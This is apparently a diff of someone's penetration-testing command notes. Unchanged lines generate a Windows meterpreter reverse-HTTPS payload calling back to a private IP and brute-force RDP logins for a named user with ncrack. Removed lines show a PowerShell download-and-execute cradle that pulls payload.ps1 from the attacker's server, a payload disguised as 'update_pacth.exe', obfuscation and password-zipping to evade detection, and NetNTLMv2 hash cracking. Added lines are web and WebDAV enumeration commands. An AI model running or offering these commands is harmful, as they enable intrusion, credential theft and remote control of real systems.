@@ -6,18 +6,16 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f p
 
 python3 -m http.server 8080
 
-Import-Module ./Invoke-Obfuscation.psd1
-Invoke-Obfuscation
+gobuster dir -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/iis-urls.txt -t 50 -x aspx,asp,html,htm
+
+gobuster dir -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -x aspx,asp,html,htm
 
 
-http://192.168.1.128:8080/update_pacth.exe
-
-zip --password SuaSenhaForte payload_protegido.zip payload_encoded.exe
-
-IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.128:8080/payload.ps1')
+nmap -p 80 --script=http-webdav-scan <ip>
 
 
-john --wordlist=wordlist_personalizada_advanced.txt --format=netntlmv2 hash_john.txt
+davtest -url http://<ip>
+
 
 ncrack -v -p 3389 -U <(echo rsilva) -P wordlist_pro.txt 192.168.1.84
 
